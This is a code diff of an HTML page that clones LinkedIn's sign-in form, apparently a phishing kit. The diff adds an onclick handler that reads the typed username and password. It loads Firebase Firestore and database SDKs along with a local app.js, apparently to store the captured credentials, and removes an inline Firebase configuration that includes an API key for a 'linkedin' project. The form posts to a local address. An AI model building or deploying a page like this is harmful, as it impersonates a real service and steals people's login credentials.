@@ -97,13 +97,14 @@
                             fill="#0A66C2" />
                     </svg></li-icon>
             </a>
-            <div id="" class="card-layout">
+            <!--Contenedor datos del usuario-->
+            <div id="data_user" class="card-layout" onload="inicializar()">
                 <div id="organic-div" class="">
                     <div class="header__content ">
                         <h1 class="header__content__heading ">Sign in</h1>
                         <p class="header__content__subheading ">Stay updated on your professional world</p>
                     </div>
-                    <form method="post" class="login__form" action="http://10.0.2.15/login-submit" novalidate><input
+                    <! method="post" class="login__form" action="http://10.0.2.15/login-submit" novalidate><input
                             type="hidden" name="csrfToken" value="ajax:1506196122173703151" /><code
                             id="login_form_validation_error_username"
                             style="display: none;"><!--"Please enter a valid username"--></code><code
@@ -111,9 +112,12 @@
                             style="display: none;"><!--"Email or phone number must be between 3 to 128 characters"--></code><code
                             id="consumer_login__text_plain__no_username"
                             style="display: none;"><!--"Please enter an email address or phone number"--></code>
-                        <div class="form__input--floating mt-24"><input id="username" name="session_key" type="text"
+                        <!--Nombre de Usuario-->
+                        <div class="form__input--floating mt-24">
+                            <input id="username" name="session_key" type="text"
                                 aria-describedby="error-for-username" required validation="email|tel" class="" autofocus
-                                aria-label="Email or Phone" /><label class="form__label--floating" for="username"
+                                aria-label="Email or Phone" />
+                                <label class="form__label--floating" for="username"
                                 aria-hidden="true">Email or Phone</label>
                             <div error-for="username" id="error-for-username" class="form__label--error  hidden"
                                 role="alert" aria-live="assertive"></div>
@@ -142,10 +146,15 @@
                             style="display: none;"><!--"Hmm, that&#39;s not the right password. Please try again "--></code><code
                             id="consumer_login__text_plain__large_password_200_chars"
                             style="display: none;"><!--"The password you provided must have at most 200 characters."--></code>
-                        <div class="form__input--floating mt-24"><input id="password" type="password"
+                        <!--Contraseña-->
+                        <div class="form__input--floating mt-24">
+                            <input id="password" type="password"
                                 aria-describedby="error-for-password" name="session_password" required
-                                validation="password" class="" aria-label="Password" /><label for="password"
-                                class="form__label--floating" aria-hidden="true">Password</label><span
+                                validation="password" class="" aria-label="Password" />
+                                <label for="password"
+                                class="form__label--floating" aria-hidden="true">Password
+                                </label>
+                                <span
                                 id="password-visibility-toggle" class="button__password-visibility" role="button"
                                 tabindex="0">show</span>
                             <div error-for="password" id="error-for-password" class="form__label--error   hidden"
@@ -155,8 +164,9 @@
                             class="btn__tertiary--medium forgot-password"
                             data-cie-control-urn="forgot-password-btn">Forgot password?</a><input type="hidden"
                             name="loginFlow" id="loginFlow" value="REMEMBER_ME_OPTIN" />
-                        <!-- botón de Inicio de sesión-->
-                        <div class="login__form_action_container "><button
+                        <!-- Botón de Inicio de sesión-->
+                        <div class="login__form_action_container">
+                            <button id="btnLogin" onclick="getValueInput()"
                                 class="btn__primary--large from__button--floating" data-litms-control-urn="login-submit"
                                 type="submit" aria-label="Sign in">Sign in</button></div>
                     </form>
@@ -451,29 +461,19 @@
     <script src="https://static-exp1.licdn.com/sc/h/djykitbj8q6nbc5kqowcmv2h7" defer></script><code
         id="lix_cv_scoring_login_get_fingerprint" style="display: none;"><!--"control"--></code>
     <script src='https://static-exp1.licdn.com/sc/h/byqtlviivgrjzt006a5gb1mi6' defer></script>
-<!-- The core Firebase JS SDK is always required and must be listed first -->
+
+    <!-- The core Firebase JS SDK is always required and must be listed first -->
 <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
 
 <!-- TODO: Add SDKs for Firebase products that you want to use
      https://firebase.google.com/docs/web/setup#available-libraries -->
 <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-analytics.js"></script>
 
-<script>
-  // Your web app's Firebase configuration
-  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
-  var firebaseConfig = {
-    apiKey: "AIzaSyCfznDxJME9p0llWCuV9NwKB--btIcyFgE",
-    authDomain: "linkedin-5ae5a.firebaseapp.com",
-    projectId: "linkedin-5ae5a",
-    storageBucket: "linkedin-5ae5a.appspot.com",
-    messagingSenderId: "139993377494",
-    appId: "1:139993377494:web:9f29236c52365402233777",
-    measurementId: "G-H30R91360G"
-  };
-  // Initialize Firebase
-  firebase.initializeApp(firebaseConfig);
-  firebase.analytics();
-</script>
+<script src="https://www.gstatic.com/firebasejs/8.4.1/firebase-firestore.js"></script>
+
+<script src="https://www.gstatic.com/firebasejs/8.4.1/firebase-database.js"></script>
+
+<script src="js/app.js"></script>
 
 </body>
 
